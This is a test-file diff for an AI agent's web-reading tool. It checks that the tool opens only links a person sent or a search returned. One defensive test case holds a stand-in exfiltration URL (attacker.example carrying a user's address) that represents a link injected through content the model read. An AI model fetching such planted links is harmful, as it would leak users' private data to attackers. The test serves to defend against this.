@@ -6,7 +6,7 @@ vi.mock("node:dns/promises", () => ({
 const keys = new Map<string, string>();
 vi.mock("@/lib/admin-config", () => ({ resolveServerKey: vi.fn(async (k: string) => keys.get(k)) }));
 
-import { fetchPage, webTools } from "./web-tools";
+import { fetchPage, linksIn, webTools } from "./web-tools";
 
 function page(status: number, body = "", headers: Record<string, string> = {}) {
   return new Response(status >= 300 && status < 400 ? null : body, { status, headers: { "content-type": "text/html", ...headers } });
@@ -147,6 +147,38 @@ describe("webTools", () => {
     const [search] = (await webTools(a, "g", { capped: false })).tools;
     expect((await search.run({ query: "x" })).isError).toBeFalsy();
     expect((a as unknown as { rpc: ReturnType<typeof vi.fn> }).rpc).not.toHaveBeenCalled();
+    fetchSpy.mockRestore();
+  });
+});
+
+describe("read_page", () => {
+  it("finds the links in a message", () => {
+    expect(linksIn("See https://shop.example/a?b=1. And (https://x.example/)")).toEqual(["https://shop.example/a?b=1", "https://x.example"]);
+  });
+
+  it("opens only a link a person sent or a search found", async () => {
+    keys.set("SERPER_API_KEY", "k");
+    const fetchSpy = vi.spyOn(globalThis, "fetch").mockImplementation(async (input) => {
+      const url = String(input);
+      if (url.startsWith("https://google.serper.dev/")) {
+        return new Response(JSON.stringify({ organic: [{ title: "Found", link: "https://found.example/page", snippet: "s" }] }));
+      }
+      return page(200, "<title>T</title><p>Hello there</p>");
+    });
+    const web = await webTools(admin(true), "g");
+    const [search, read] = web.tools;
+
+    // A link the model read in an invite or a note, carrying data out.
+    const leak = await read.run({ url: "https://attacker.example/?d=alice-address" });
+    expect(leak.isError).toBe(true);
+    expect(leak.content[0].text).toContain("Only a link from a web search");
+    expect(fetchSpy).not.toHaveBeenCalled();
+
+    web.allowLinksFrom("can you check https://sent.example/item please");
+    expect((await read.run({ url: "https://sent.example/item" })).isError).toBeFalsy();
+
+    await search.run({ query: "thing" });
+    expect((await read.run({ url: "https://found.example/page" })).isError).toBeFalsy();
     fetchSpy.mockRestore();
   });
 });
